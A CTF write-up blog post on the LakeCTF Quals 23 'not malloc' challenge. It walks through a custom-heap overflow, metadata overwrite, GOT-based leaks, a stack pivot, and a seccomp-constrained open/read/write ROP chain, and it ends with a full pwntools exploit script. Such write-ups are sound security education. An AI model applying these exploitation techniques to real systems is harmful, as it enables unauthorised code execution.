---
layout: post
title: "LakeCTF Quals 23 - not malloc Write up"
date: 2023-11-06 23:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
media_subpath: /assets/img/20231106_LakeCTF-Quals-23_write-up
image: 1.png
---

Due to attending POC Conference, I couldn't entirely solve this. During CTF, I found a vulnerability that custom heap which they implemented has BOF, but it takes a longer time for me to exploit it than I expected.

## **not malloc (19 solves)**

### **[0x01] Summary**

- The author has implemented custom heap (notmalloc), and it has vuln about bof.
- Through this, we can leak chunk metadata and overwrite it (similar to fastbin dup).
- It makes AAW/AAR and I exploited it with `mov rsp, rdx` gadget bypassing seccomp.

### **[0x02] Solution**

```bash
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x09 0x00 0x40000000  if (A >= 0x40000000) goto 0013
 0004: 0x15 0x07 0x00 0x00000009  if (A == mmap) goto 0012
 0005: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0012
 0006: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0012
 0007: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0012
 0008: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0012
 0009: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0012
 0010: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0012
 0011: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

The binary has seccomp mitigation, so we can only use the syscalls(ORW, mmap) above.

```c
// contains user data
void* data_heap;

// contains metadata used by the allocator
void* metadata_heap;

// wilderness
char* top_chunk;

// setup
void __attribute__((constructor)) setup(){
  setbuf(stdin,NULL);
  setbuf(stdout,NULL);
  setbuf(stderr,NULL);

  size_t heap_size = 0;
  printf("HEAP SIZE > ");
  scanf("%zx%*c",&heap_size);
  if(heap_size < MIN_HEAP_SIZE) {
    printf("please pick a heap size >= 0x%zx\n",MIN_HEAP_SIZE);
    exit(1);
  }
  metadata_heap = get_mapping(NULL,MAP_PRIVATE | MAP_ANONYMOUS,heap_size);
  data_heap = get_mapping(NULL,MAP_PRIVATE | MAP_ANONYMOUS,heap_size);
  ...
```

`data_heap` is heap base, and `metadata_heap` stores chunk metadata. They gets a consecutive address at `setup`.

Also, under the allocation logic, `top_chunk` can cross the `metadata_heap` address, so we can overwrite the metadata of chunk.

```c
typedef struct chunk_metadata {
  struct chunk_metadata* next;
  size_t size;
  bool is_free;
} chunk_metadata;
```

The structure of metadata is composed of the members(`next`, `size`, `is_free`).

When allocating chunk at `metadata_heap`, we can leak `notmalloc heap` and `libnotmalloc.so` through `next`.

After this, we should get the base address of libc using GOT at `libnotmalloc.so`.

```c
void create() {
  size_t index = get_index();

  printf("size > ");
  size_t size = get_number();
  if(!size) return;

  entries[index] = (char*) not_malloc(size);
  if(!entries[index]) {
    puts("alloc error");
    exit(1);
  }

  printf("content > ");
  fgets(entries[index],size,stdin);
}

void show() {
  size_t index = get_index();
  if(!entries[index]) {
    puts("<empty>");
  } else {
    chunk_metadata* meta = get_metadata(entries[index]);
    printf("size : %zu\n",meta->size);
    printf("content : %s\n",entries[index]);
  }
}
```

We can allocate GOT section by overwriting `next`, but there is the restriction. `create` function forces us to write any string.

But, it can be bypassed for entering a huge number like negative value. `size` is never validated at `create`.

Using it, we can just allocate a chunk at GOT section and leak libc address.

```shell
$ checksec libnotmalloc.so
[*] '/home/brwook/ctf/40_LakeCTF/not_malloc/libnotmalloc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The library has a weak mitigation (Partial RELRO) and it means that we can overwrite GOT of this.

```c
// free chunk
void not_free(char* chunk){
  size_t size = get_metadata(chunk)->size;
  if(!size || (size % UNIT_SIZE)) {
    puts("corrupted chunk size");
    exit(1);
  }
  if(size >= QUICK_BIN_MAX) {
    link_(chunk,&misc_bin);
  } else {
    link_(chunk,&(quick_bins[get_metadata(chunk)->size/UNIT_SIZE-1]));
  }
}
```

After knowing it, I thought a lot of vectors and overwrited `link_@got.plt` with the `mov rsp, rdx` gadget.

![2.png](2.png)
*rdx register has address that we can overwrite*

We can overwrite the GOT section through the technic similar to fastbin dup. And it means we can write ROP payload and execute it.

As we've seen before, the allowed syscalls are mmap and ORW, and we can get the flag by using these.

```py
from pwn import *
choice = lambda x:p.sendlineafter(b"> ", str(x).encode())
def create(idx, size, content=False):
    choice(1)
    choice(idx)
    choice(size)
    if content:
        p.sendlineafter(b"> ", content)

def show(idx):
    choice(2)
    choice(idx)

def free(idx):
    choice(3)
    choice(idx)

context(arch='amd64')
p = process('./chal', aslr=1)
shellcode = shellcraft.open('./flag')
shellcode += shellcraft.read('rax', 'rsp', 0x40)
shellcode += shellcraft.write(1, 'rsp', 0x40)
code = asm(shellcode)

libc = ELF("/home/brwook/ctf/40_LakeCTF/not_malloc/libc.so.6", False)
libnotmalloc = ELF("/home/brwook/ctf/40_LakeCTF/not_malloc/libnotmalloc.so", False)

heap_size = 0x4000
p.sendlineafter(b"HEAP SIZE > ", hex(heap_size).encode())
p.sendlineafter(b"> ", b'2')

# 1. libnotmalloc leak through misc_bin.head->next
create(0, heap_size // 4, b'dummy')
create(1, heap_size // 4, b'dummy')
create(2, 0x100, p64(0) + p64(heap_size // 4) + p64(1)) # located at chunk_metadata
free(1)
free(0)

show(2)
p.recvuntil(b"content : ")
notmalloc_heap = u64(p.recv(6).ljust(8, b'\x00')) - 0x3020
log.success(f"notmalloc heap @ {hex(notmalloc_heap)}")
assert notmalloc_heap & 0xFFF == 0x0

libnotmalloc.address = notmalloc_heap + 0x9000
log.success(f"libnotmalloc base @ {hex(libnotmalloc.address)}")

free(2)

# 2. overwrite misc_bin.head->next with setbuf@got.plt of libnotmalloc
create(2, 0x100, p64(libnotmalloc.got.setbuf + 0x2000) + p64(0x2000) + p64(1))
create(0, heap_size // 2, b'dummy')

# 3. libc leak through failing at fgets
create(1, -1)

show(1)
p.recvuntil(b"content : ")
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['setbuf']
mov_rsp_rdx = libc.address + 0x0005a170  # 0x0005a170: mov rsp, rdx; ret;
log.info(f"libc @ {hex(libc.address)}")

free(2)
free(0)

# 4. overwrite link_@got.plt with mov_rsp_rdx gadget
create(2, 0x100, p64(libnotmalloc.got.link_ + 0x2000) + p64(0x2000) + p64(1))
free(2)
create(0, 0x2000, b'dummy')
rop = ROP([libc])
mmap_address = 0x12345000
payload = flat(
    mov_rsp_rdx,
    libnotmalloc.sym.unlink_,
    libnotmalloc.sym.get_metadata,
    libnotmalloc.sym.get_chunk,
    libnotmalloc.sym.extend_mapping,
    libnotmalloc.sym.backward_consolidate,
    libc.sym.__isoc99_scanf,
    libc.sym.exit,
    libnotmalloc.address + 0x40a8,
)
payload += b'\x00'*0x30 + p64(notmalloc_heap) + p64(notmalloc_heap + 0x2000)
payload += p64(notmalloc_heap + 0x2120) + b'\x00'*8
rop.call("mmap", [mmap_address, 0x1000, 7, 34])
rop.call("read", [0, mmap_address, 0x1000])
payload += rop.chain()
payload += p64(mmap_address)

create(1, 0x800, payload)

# 5. trigger rop chain (mmap, read, and execute ORW shellcode)
free(0)
p.send(code)

p.interactive()
```